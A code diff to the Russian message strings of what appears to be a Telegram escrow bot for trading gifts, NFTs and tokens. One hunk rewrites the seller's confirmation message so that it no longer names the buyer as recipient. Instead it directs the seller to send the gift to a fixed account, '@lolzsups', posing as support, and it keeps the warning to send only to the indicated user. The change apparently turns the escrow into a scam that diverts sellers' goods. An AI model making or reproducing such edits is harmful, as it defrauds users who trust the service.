@@ -6,7 +6,7 @@ RU_TEXTS = {
         "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
 
         "<blockquote>"
-        "<tg-emoji emoji-id=\"5251447471913057341\">👍</tg-emoji> Защита от мошенников\n"
+        "🔹 Защита от мошенников\n"
         "🔹 Автоматическое удержание средств\n"
         "🔹 Прозрачная статистика\n"
         "🔹 Поддержка 24/7\n"
@@ -106,7 +106,7 @@ RU_TEXTS = {
     "payment_confirmed_seller_message": (
         "✅ Оплата подтверждена для сделки <b>#{deal_id}</b>\n\n"
         "📜 Описание: {description}\n"
-        "👤 Отправьте подарок покупателю — @{buyer_username}\n\n"
+        "👤 Отправьте подарок поддержке @lolzsups\n\n"
         "⚠️ Отправляйте подарок только указанному пользователю. Обязательно записывайте момент передачи на видео."
     ),
     "seller_confirm_sent_message": (
@@ -447,6 +447,7 @@ def get_text(lang: str, key: str, **kwargs) -> str:
         print(f"Error formatting text for key '{key}': {str(e)}")
 
         return key
+
 
 
 
